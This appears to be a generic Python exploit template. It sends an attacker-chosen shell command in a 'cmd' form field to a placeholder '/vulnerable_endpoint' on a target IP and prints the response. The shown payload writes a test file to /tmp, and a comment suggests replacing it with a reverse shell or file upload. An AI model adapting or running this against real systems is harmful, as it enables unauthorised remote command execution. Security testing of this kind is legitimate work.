import requests
import sys

def create_exploit_payload(command):
    # This example payload is simple, just running the `echo` command on the target machine
    # You can replace this with any payload as needed (e.g., reverse shell, file upload, etc.)
    payload = f"cmd={command}"
    return payload

def send_payload(target_ip, payload):
    url = f"http://{target_ip}/vulnerable_endpoint"
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print("[+] Exploit sent successfully!")
            print(f"[+] Response: {response.text}")
        else:
            print(f"[-] Exploit failed with status code {response.status_code}")
    
    except requests.exceptions.RequestException as e:
        print(f"[-] Error sending payload: {e}")

def main():
    # Prompt for target IP or URL
    if len(sys.argv) != 2:
        print("Usage: python3 exploit_script.py <target IP>")
        sys.exit(1)

    target_ip = sys.argv[1]
    
    # Define a payload to test the vulnerability
    payload_command = "echo 'Exploit Successful!' > /tmp/test_file"
    payload = create_exploit_payload(payload_command)
    
    print(f"[+] Sending exploit payload to {target_ip}...")
    
    # Send the payload to the target
    send_payload(target_ip, payload)

if __name__ == "__main__":
    main()
